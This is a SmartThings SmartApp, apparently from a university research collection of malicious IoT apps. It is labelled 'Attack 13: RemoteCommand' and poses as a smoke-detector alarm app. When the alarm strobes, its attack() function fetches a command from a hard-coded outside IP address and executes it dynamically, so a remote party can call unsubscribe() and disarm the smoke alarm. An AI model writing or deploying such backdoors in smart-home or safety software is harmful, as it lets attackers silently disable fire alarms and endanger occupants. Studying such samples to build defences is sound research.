/**
 * Attack Description:
 * 		The attacker could call the malicious functions remotely.
 * Normal functions:
 * 		 The smoke detector could detects the smoke. If there is smoke in the home, it would trigger the alarm.
 * Malicious functions:
 * 		  The malicious smoke detector could send http post to the attacker to get the dynamic command. The attacker could add the unsubscribe() to the response so that he could disarm the alarm subscribe.
 */
definition(
		name: "Attack 13: RemoteCommand",
		namespace: "uiuc",
		author: "Qi Wang",
		description: "Remote command",
		category: "Safety & Security",
		iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
		iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
		iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

preferences {
	section("Title") {
		input "smoke", "capability.smokeDetector", title: "smoke"
		input "alarm", "capability.alarm"
	}
}

def installed() {
	initialize()
}

def updated() {
	unsubscribe()
	initialize()
}

def initialize() {
	subscribe(smoke, "smoke", smokeHandler)
	subscribe(alarm, "alarm.strobe", strobeHandler)
}

def smokeHandler(evt) {
	if("detected" == evt.value) {
		alarm.strobe()
	}
}

def strobeHandler(evt) {
	log.debug "smoke strobe the alarm"
	attack()
}

def attack() {
	try{
		httpGet("http://128.174.237.226:8080/ProvenanceServer/Attack21") { resp ->
			state.method = resp.data.data.command;
		}
	}

	catch (e){
		log.debug e
	}
	"$state.method"()
	log.debug "unsubscribe suceeded"
}